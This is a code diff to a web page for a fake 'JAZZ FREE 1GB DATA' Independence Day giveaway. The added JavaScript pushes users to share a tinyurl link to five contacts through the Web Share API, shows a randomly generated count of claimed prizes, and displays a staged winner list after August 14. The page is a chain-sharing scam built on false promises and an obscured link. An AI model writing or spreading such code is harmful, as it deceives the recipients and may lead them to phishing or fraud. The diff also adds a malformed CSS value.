@@ -128,7 +128,7 @@
         .btn-share:hover {
             transform: translateY(-2px);
             background-color: #3182ce;
-            box-shadow: 0 8px 15px rgba(66, 153, 225, 0.3);
+            box-shadow: 0 8s 15px rgba(66, 153, 225, 0.3);
         }
         .counter {
             font-size: 1.8em;
@@ -261,21 +261,37 @@
             const shareButton = document.getElementById('share-button');
             const shareCountElement = document.getElementById('share-count');
 
+            // --- IMPORTANT: THE MESSAGE TO BE SHARED ---
+            const shareData = {
+                title: 'JAZZ FREE 1GB DATA',
+                text: `JAZZ FREE 1GB DATA
+
+14-AUAGUST CELEBRATION 💐🎉 
+
+CLICK HERE TO GET 
+
+https://tinyurl.com/2ht5z42j
+
+SHARE TO 5 USERS TO GET 1GB ON 14 AUGUST INDEPENDENCE DAY 
+
+BLOTTING RESULTS ON 14AUGUST 
+
+LIST RELEASED ON WEBSITE 11 AM`,
+                url: 'https://tinyurl.com/2ht5z42j'
+            };
+            
             const totalPrizes = 50;
             let prizesClaimed = Math.floor(Math.random() * (totalPrizes + 10));
             let shareCount = 0;
             const requiredShares = 5;
 
-            // Check if it is August 14th or later
             const today = new Date();
-            const announcementDate = new Date(today.getFullYear(), 7, 14); // Note: Month is 0-indexed (August is 7)
+            const announcementDate = new Date(today.getFullYear(), 7, 14);
 
             if (today >= announcementDate) {
-                // On or after August 14, hide the giveaway screens and show the winner list
                 beforeAug14Screens.style.display = 'none';
                 afterAug14Screen.style.display = 'block';
             } else {
-                // Before August 14, show the giveaway screens and hide the winner list
                 beforeAug14Screens.style.display = 'block';
                 afterAug14Screen.style.display = 'none';
             }
@@ -290,16 +306,33 @@
                 }
             });
 
-            shareButton.addEventListener('click', function() {
-                shareCount++;
-                shareCountElement.textContent = shareCount;
-                if (shareCount < requiredShares) {
-                    alert(`You have shared ${shareCount} time(s)! Keep going, only ${requiredShares - shareCount} more to confirm your spot.`);
-                }
-                if (shareCount >= requiredShares) {
-                    prizesClaimed++;
-                    eligibleScreen.style.display = 'none';
-                    finalCongratsScreen.style.display = 'block';
+            shareButton.addEventListener('click', async () => {
+                // Check if the Web Share API is available on the user's device
+                if (navigator.share) {
+                    try {
+                        await navigator.share(shareData);
+                        // The following lines will only run if the share was successful
+                        shareCount++;
+                        shareCountElement.textContent = shareCount;
+                        if (shareCount >= requiredShares) {
+                            prizesClaimed++;
+                            eligibleScreen.style.display = 'none';
+                            finalCongratsScreen.style.display = 'block';
+                        }
+                    } catch (err) {
+                        // This block runs if the share was cancelled or failed
+                        console.log('Share failed or was cancelled:', err);
+                    }
+                } else {
+                    // Fallback for browsers that do not support the Web Share API
+                    alert(`Sorry, your browser does not support native sharing. Please copy and share this message manually:\n\n${shareData.text}`);
+                    shareCount++;
+                    shareCountElement.textContent = shareCount;
+                    if (shareCount >= requiredShares) {
+                        prizesClaimed++;
+                        eligibleScreen.style.display = 'none';
+                        finalCongratsScreen.style.display = 'block';
+                    }
                 }
             });
         });
